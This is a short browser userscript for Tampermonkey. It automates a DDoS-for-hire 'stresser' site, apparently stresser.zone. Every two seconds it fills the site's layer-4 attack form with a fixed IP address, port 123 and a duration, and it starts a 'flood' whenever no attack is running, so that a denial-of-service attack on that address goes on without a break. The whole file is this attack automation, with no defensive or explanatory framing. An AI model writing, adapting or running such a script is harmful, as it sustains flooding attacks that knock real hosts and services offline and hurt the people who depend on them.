// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      2024-08-18
// @description  try to take over the world!
// @author       You
// @match        http*://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=stresser.zone
// @grant        none
// ==/UserScript==

var autoddos = setInterval(function (){
    document.getElementById("hostL4").value = "103.222.255.36";
    document.getElementById("portL4").value = "123";
    document.getElementById("timeL4").value = "120";
    document.getElementById("methodL4").selectedIndex = 1;
    if(document.getElementById("attacksinprogress").textContent.length == 0){
        L4btn('flood', '');
    }
},2000)
